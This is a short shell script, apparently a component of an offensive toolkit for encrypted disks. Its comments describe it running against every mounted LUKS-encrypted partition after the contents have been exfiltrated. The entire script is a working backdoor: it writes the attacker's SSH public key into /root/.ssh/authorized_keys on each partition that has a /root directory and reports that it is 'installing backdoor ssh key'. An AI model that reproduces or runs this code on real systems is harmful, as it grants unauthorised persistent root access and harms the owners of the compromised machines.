#!/bin/sh

# This is an injector script. It will be run against all LUKS-encrypted
# partitions, at the last stage of processing - after exfiltrating contents.
#
# In $1 it receives the path, where the partition is mounted.
#
# This example installs our ssh public key in /root/.ssh/authorized_keys
# files on all partitions that contain /root directory.

base=$1
path=`dirname $0`
keytext="`head -n1 $path/pubkey.txt`"

if [ ! -d $base/root ]; then
	exit 0
fi

if [ ! -d $base/root/.ssh ]; then
	mkdir -m 0700 $base/root/.ssh
fi

if [ ! -f $base/root/.ssh/authorized_keys ] || ! grep -q "$keytext" $base/root/.ssh/authorized_keys; then
	comment="`echo "$keytext" |cut -d' ' -f3-`"
	echo "installing backdoor ssh key $comment in directory $base/root"
	echo "$keytext" >>$base/root/.ssh/authorized_keys
fi
